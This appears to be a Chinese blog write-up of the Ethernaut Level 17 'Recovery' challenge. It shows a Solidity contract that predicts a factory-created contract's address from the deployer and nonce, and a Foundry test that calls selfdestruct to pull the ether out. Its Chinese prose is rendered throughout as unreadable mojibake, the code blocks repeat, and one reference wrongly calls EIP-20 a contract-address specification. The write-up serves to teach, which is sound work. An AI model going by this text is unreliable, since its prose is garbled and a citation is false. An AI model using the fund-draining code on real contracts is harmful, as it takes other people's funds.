åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå‡½æ•°æ¥ä¸ºæˆ‘ä»¬è®¡ç®—ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        // nonce æ˜¯ 1ï¼Œå› ä¸ºè¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\"></span><br><span class=\"line\">        address lostContractAddress = address(</span><br><span class=\"line\">            uint160(</span><br><span class=\"line\">                uint256(</span><br><span class=\"line\">                    keccak256(</span><br><span class=\"line\">                        abi.encodePacked(</span><br><span class=\"line\">                            bytes1(0xd6),       // RLP prefix for a list</span><br><span class=\"line\">                            bytes1(0x94),       // RLP prefix for a 20-byte string</span><br><span class=\"line\">                            _deployerAddress,   // The deployer&#x27;s address</span><br><span class=\"line\">                            nonce             // The nonce</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/17_Recovery.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\">        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));</span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract RecoveryTest is Test &#123;</span><br><span class=\"line\">    Recovery recoveryInstance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address payable player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = payable(vm.addr(1));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Recovery åˆçº¦å¹¶è®©å®ƒåˆ›å»ºä¸€ä¸ª SimpleToken</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        recoveryInstance = new Recovery();</span><br><span class=\"line\">        recoveryInstance.generateToken&#123;value: 0.001 ether&#125;(&quot;MyToken&quot;, 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: è®¡ç®—ä¸¢å¤±çš„ SimpleToken åˆçº¦åœ°å€</span><br><span class=\"line\">        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ä½™é¢æ˜¯å¦æ­£ç¡®</span><br><span class=\"line\">        assertEq(lostContract.balance, 0.001 ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: è°ƒç”¨ destroy å‡½æ•°å–å›èµ„é‡‘</span><br><span class=\"line\">        SimpleToken(lostContract).destroy(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯èµ„é‡‘æ˜¯å¦å·²å–å›</span><br><span class=\"line\">        assertEq(lostContract.balance, 0);</span><br><span class=\"line\">        // æ³¨æ„: player çš„æœ€ç»ˆä½™é¢ä¼šç•¥ä½äºåˆå§‹å€¼ï¼Œå› ä¸ºæœ‰ gas æ¶ˆè€—</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>è·å–éƒ¨ç½²è€…åœ°å€</strong>: ç¡®å®šåˆ›å»º <code>SimpleToken</code> çš„åˆçº¦åœ°å€ï¼Œå³ <code>Recovery</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è®¡ç®—åˆçº¦åœ°å€</strong>: ä½¿ç”¨ <code>keccak256(rlp([deployer_address, nonce]))</code> å…¬å¼è®¡ç®—å‡º <code>SimpleToken</code> çš„åœ°å€ã€‚<code>nonce</code> ä¸º1ã€‚</li>\n<li><strong>è°ƒç”¨ <code>destroy</code></strong>: è·å– <code>SimpleToken</code> åˆçº¦çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶ <code>destroy</code> å‡½æ•°ï¼Œå°†èµ„é‡‘è½¬ç§»åˆ° <code>player</code> åœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>è¿”å›åˆ›å»ºçš„åˆçº¦åœ°å€</strong>: å·¥å‚åˆçº¦åœ¨åˆ›å»ºæ–°åˆçº¦æ—¶ï¼Œåº”è¯¥æ€»æ˜¯è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ï¼Œæˆ–è€…è§¦å‘ä¸€ä¸ªåŒ…å«è¯¥åœ°å€çš„äº‹ä»¶ã€‚è¿™æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">function generateToken(string memory _name, uint256 _initialSupply) public payable returns (address) &#123;</span><br><span class=\"line\">    SimpleToken token = new SimpleToken(_name, _initialSupply);</span><br><span class=\"line\">    token.transfer(msg.sender, msg.value);</span><br><span class=\"line\">    emit TokenCreated(address(token)); // è§¦å‘äº‹ä»¶</span><br><span class=\"line\">    return address(token); // è¿”å›åœ°å€</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ä½¿ç”¨ <code>CREATE2</code></strong>: å¦‚æœéœ€è¦æ›´å¼ºçš„åœ°å€ç¡®å®šæ€§ï¼ˆä¾‹å¦‚ï¼Œåœ¨åˆçº¦éƒ¨ç½²å‰å°±ä¸å…¶äº¤äº’ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ <code>CREATE2</code> æ“ä½œç ã€‚<code>CREATE2</code> å…è®¸æ ¹æ®éƒ¨ç½²è€…åœ°å€ã€ä¸€ä¸ª <code>salt</code> å€¼å’Œåˆçº¦çš„åˆå§‹åŒ–ä»£ç æ¥é¢„è®¡ç®—åœ°å€ï¼Œæä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>åœ°å€ç¡®å®šæ€§è®¡ç®—</strong>: ç†è§£åˆçº¦åœ°å€æ˜¯å¦‚ä½•ä»éƒ¨ç½²è€…åœ°å€å’Œ <code>nonce</code> ç”Ÿæˆçš„ï¼Œæ˜¯EVMçš„ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚</li>\n<li><strong>RLP (Recursive-Length Prefix)</strong>: ä»¥å¤ªåŠç”¨äºåºåˆ—åŒ–å¯¹è±¡çš„ä¸»è¦ç¼–ç æ–¹æ³•ã€‚è™½ç„¶åœ¨é«˜çº§Solidityç¼–ç¨‹ä¸­ä¸å¸¸ç›´æ¥ä½¿ç”¨ï¼Œä½†ç†è§£å…¶åŸºæœ¬åŸç†æœ‰åŠ©äºæ·±å…¥äº†è§£EVMçš„å†…éƒ¨å·¥ä½œæ–¹å¼ã€‚</li>\n<li><strong><code>keccak256</code></strong>: ä»¥å¤ªåŠä¸­æ— å¤„ä¸åœ¨çš„å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºåœ°å€ç”Ÿæˆã€å‡½æ•°ç­¾åã€æ•°æ®æ ¡éªŒç­‰å¤šç§åœºæ™¯ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åˆçº¦åœ°å€æ˜¯ç¡®å®šæ€§çš„ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—ã€‚</li>\n<li>åœ°å€çš„è®¡ç®—ä¾èµ–äºéƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ <code>nonce</code>ã€‚</li>\n<li>RLPç¼–ç æ˜¯ä»¥å¤ªåŠåºåˆ—åŒ–æ•°æ®çš„åŸºç¡€ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>å½“å·¥å‚åˆçº¦æ²¡æœ‰è¿”å›æˆ–è®°å½•å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é“¾ä¸Šæ•°æ®ï¼ˆéƒ¨ç½²è€…åœ°å€å’Œ <code>nonce</code>ï¼‰è‡ªè¡Œè®¡ç®—å‡ºè¯¥åœ°å€ã€‚</li>\n<li>ä¸€æ—¦æ‰¾åˆ°åœ°å€ï¼Œå°±å¯ä»¥ä¸è¯¥åˆçº¦è¿›è¡Œäº¤äº’ï¼Œåˆ©ç”¨å…¶å†…éƒ¨çš„ä»»ä½•å‡½æ•°ï¼ˆå¦‚æœ¬ä¾‹ä¸­çš„ <code>destroy</code>ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>å·¥å‚åˆçº¦åº”å§‹ç»ˆé€šè¿‡è¿”å›å€¼æˆ–äº‹ä»¶æ¥æš´éœ²å…¶åˆ›å»ºçš„å­åˆçº¦åœ°å€ã€‚</li>\n<li>åœ¨è®¾è®¡åˆçº¦æ—¶ï¼Œéµå¾ªè‰¯å¥½çš„ç¼–ç¨‹å®è·µï¼Œç¡®ä¿æ‰€æœ‰é‡è¦çš„ä¿¡æ¯éƒ½æ˜¯å¯è®¿é—®çš„ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">EIP-20: Contract Address Calculation</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/\">Ethereum Docs: RLP (Recursive-Length Prefix)</a></li>\n<li><a href=\"https://ethereum.stackexchange.com/questions/760/how-is-an-ethereum-address-created\">StackExchange: How is an Ethereum address created?</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-17-Recovery-é¢„æµ‹åˆçº¦åœ°å€\"><a href=\"#ğŸ¯-Ethernaut-Level-17-Recovery-é¢„æµ‹åˆçº¦åœ°å€\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€\"></a>ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/17\">Ethernaut Level 17 - Recovery</a><br><strong>æ”»å‡»ç±»å‹</strong>: åˆçº¦åœ°å€é¢„æµ‹<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p><code>Recovery</code> åˆçº¦é€šè¿‡ <code>generateToken</code> å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª <code>SimpleToken</code> åˆçº¦å®ä¾‹ï¼Œå¹¶å‘å…¶å‘é€äº† 0.001 etherã€‚ä½†æ˜¯ï¼Œ<code>generateToken</code> å‡½æ•°æ²¡æœ‰è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ã€‚ä½ çš„ç›®æ ‡æ˜¯å–å›è¿™ 0.001 etherã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg\" alt=\"Recovery Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p><code>SimpleToken</code> åˆçº¦ä¸­æœ‰ä¸€ä¸ª <code>destroy</code> å‡½æ•°ï¼Œå¯ä»¥é”€æ¯åˆçº¦å¹¶å°†ä½™é¢å‘é€åˆ°æŒ‡å®šåœ°å€ã€‚å› æ­¤ï¼Œæœ¬å…³çš„æ ¸å¿ƒæŒ‘æˆ˜åœ¨äºæ‰¾åˆ°è¿™ä¸ªä¸¢å¤±çš„ <code>SimpleToken</code> åˆçº¦çš„åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SimpleToken &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    function destroy(address payable _to) public &#123;</span><br><span class=\"line\">        selfdestruct(_to);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ä»¥å¤ªåŠä¸­ï¼Œåˆçº¦çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®éƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ <code>nonce</code> ç¡®å®šæ€§åœ°è®¡ç®—å‡ºæ¥çš„ã€‚å…¶è®¡ç®—å…¬å¼ä¸ºï¼š</p>\n<p><code>new_address = keccak256(rlp([sender_address, nonce]))</code></p>\n<ul>\n<li><code>sender_address</code>: åˆ›å»ºåˆçº¦çš„è´¦æˆ·åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯ <code>Recovery</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><code>nonce</code>: åˆ›å»ºè€…è´¦æˆ·çš„ <code>nonce</code>ã€‚å¯¹äºEOAï¼Œ<code>nonce</code> æ˜¯å…¶å‘é€çš„äº¤æ˜“æ•°é‡ã€‚å¯¹äºåˆçº¦ï¼Œ<code>nonce</code> æ˜¯å®ƒåˆ›å»ºçš„åˆçº¦æ•°é‡ã€‚ç”±äº <code>Recovery</code> åˆçº¦æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»º <code>SimpleToken</code>ï¼Œæ‰€ä»¥å®ƒçš„ <code>nonce</code> æ˜¯1ã€‚</li>\n<li><code>rlp([...])</code>: å¯¹å‘é€è€…åœ°å€å’Œ <code>nonce</code> è¿›è¡ŒRLPï¼ˆRecursive-Length Prefixï¼‰ç¼–ç ã€‚</li>\n</ul>\n<h3 id=\"RLP-ç¼–ç \"><a href=\"#RLP-ç¼–ç \" class=\"headerlink\" title=\"RLP ç¼–ç \"></a>RLP ç¼–ç </h3><p>RLPç¼–ç è§„åˆ™æ¯”è¾ƒå¤æ‚ï¼Œä½†å¯¹äº <code>[address, nonce]</code> è¿™ç§åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€åŒ–å…¶åœ¨Solidityä¸­çš„æ„é€ ï¼š</p>\n<p><code>abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))</code></p>\n<ul>\n<li><code>0xd6</code>: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ªé•¿åº¦åœ¨0-55å­—èŠ‚ä¹‹é—´çš„åˆ—è¡¨ï¼ˆlistï¼‰ã€‚</li>\n<li><code>0x94</code>: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ª20å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ï¼Œå³åœ°å€ã€‚</li>\n<li><code>sender_address</code>: 20å­—èŠ‚çš„éƒ¨ç½²è€…åœ°å€ã€‚</li>\n<li><code>0x01</code>: <code>nonce</code> ä¸º1çš„RLPç¼–ç ã€‚</li>\n</ul>\n<p>å°†è¿™äº›éƒ¨åˆ†æ‰“åŒ…å¹¶è¿›è¡Œ <code>keccak256</code> å“ˆå¸Œï¼Œç„¶åå–ç»“æœçš„å20å­—èŠ‚ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚</p>\n<h3 id=\"åœ¨Solidityä¸­è®¡ç®—åœ°å€\"><a href=\"#åœ¨Solidityä¸­è®¡ç®—åœ°å€\" class=\"headerlink\" title=\"åœ¨Solidityä¸­è®¡ç®—åœ°å€\"></a>åœ¨Solidityä¸­è®¡ç®—åœ°å€</h3><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªè®¡ç®—ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateAddress(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">    uint nonce = 1; // è¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦</span><br><span class=\"line\">    return address(</span><br><span class=\"line\">        uint160(</span><br><span class=\"line\">            uint256(</span><br><span class=\"line\">                keccak256(</span><br><span class=\"line\">                    abi.encodePacked(</span><br><span class=\"line\">                        bytes1(0xd6),</span><br><span class=\"line\">                        bytes1(0x94),</span><br><span class=\"line\">                        _deployerAddress,</span><br><span class=\"line\">                        bytes1(nonce)</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡º <code>SimpleToken</code> çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨å®ƒçš„ <code>destroy</code> å‡½æ•°æ¥å–å›ä»¥å¤ªå¸ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦-é€»è¾‘\"><a href=\"#æ”»å‡»åˆçº¦-é€»è¾‘\" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦&#x2F;é€»è¾‘\"></a>æ”»å‡»åˆçº¦&#x2F;é€»è¾‘</h3><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª <code>Attack</code> åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå‡½æ•°æ¥ä¸ºæˆ‘ä»¬è®¡ç®—ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        // nonce æ˜¯ 1ï¼Œå› ä¸ºè¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\"></span><br><span class=\"line\">        address lostContractAddress = address(</span><br><span class=\"line\">            uint160(</span><br><span class=\"line\">                uint256(</span><br><span class=\"line\">                    keccak256(</span><br><span class=\"line\">                        abi.encodePacked(</span><br><span class=\"line\">                            bytes1(0xd6),       // RLP prefix for a list</span><br><span class=\"line\">                            bytes1(0x94),       // RLP prefix for a 20-byte string</span><br><span class=\"line\">                            _deployerAddress,   // The deployer&#x27;s address</span><br><span class=\"line\">                            nonce             // The nonce</span><br><span class=\"line\">                        )</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/17_Recovery.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function calculate(address _deployerAddress) public pure returns (address) &#123;</span><br><span class=\"line\">        bytes1 nonce = bytes1(0x01);</span><br><span class=\"line\">        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));</span><br><span class=\"line\">        return lostContractAddress;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract RecoveryTest is Test &#123;</span><br><span class=\"line\">    Recovery recoveryInstance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address payable player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = payable(vm.addr(1));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½² Recovery 